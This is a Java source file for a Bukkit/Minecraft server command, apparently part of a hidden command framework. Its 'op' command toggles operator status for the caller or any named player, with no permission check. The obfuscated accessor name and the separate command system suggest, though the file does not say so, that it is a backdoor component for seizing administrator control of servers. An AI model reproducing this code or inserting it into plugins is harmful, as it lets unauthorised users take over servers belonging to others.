package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class OP implements Command {
    @Override
    public int minAConsoleArgs() {
        return 1;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"op"};
    }

    @Override
    public String getDescription() {
        return "Toggles op of you or another user.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();

        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            if (args.length == 0) {
                executor.setOp(!executor.isOp());
                sender.sendMessage(Colors.Prefix + (executor.isOp() ? Colors.Success : Colors.Failure) + "Successfully toggled your op " + (executor.isOp() ? "on" : "off") + "!");
                return;
            }

            Player foundPlayer = Bukkit.getPlayer(args[0]);
            if (foundPlayer == null) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
                return;
            }

            foundPlayer.setOp(!foundPlayer.isOp());
            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully toggled " + foundPlayer.getName() + "'s op " + (foundPlayer.isOp() ? "on" : "off") + "!");
        });
    }
}
